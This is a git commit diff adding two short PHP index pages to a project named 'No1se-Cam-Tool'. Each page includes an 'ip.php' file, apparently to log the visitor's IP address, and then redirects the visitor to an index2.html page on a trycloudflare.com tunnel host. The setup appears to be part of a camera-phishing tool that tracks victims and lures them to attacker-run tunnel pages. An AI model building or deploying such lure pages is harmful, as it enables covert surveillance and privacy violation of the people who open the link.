9ab4a5e307eac5d05fb9fedd9d4b289f8ff1c233
no1se2 <98566890+no1se2@users.noreply.github.com>
2022-04-07 17:45:12 -0400

    Add files via upload

---
+++ No1se-Cam-Tool/jio/index.php
@@ -0,0 +1,5 @@
+<?php
+include 'ip.php';
+header('Location: https://catalogs-advanced-dead-ones.trycloudflare.com/index2.html');
+exit
+?>
---
+++ No1se-Cam-Tool/om/index.php
@@ -0,0 +1,5 @@
+<?php
+include 'ip.php';
+header('Location: https://community-vacuum-exam-workout.trycloudflare.com/index2.html');
+exit
+?>
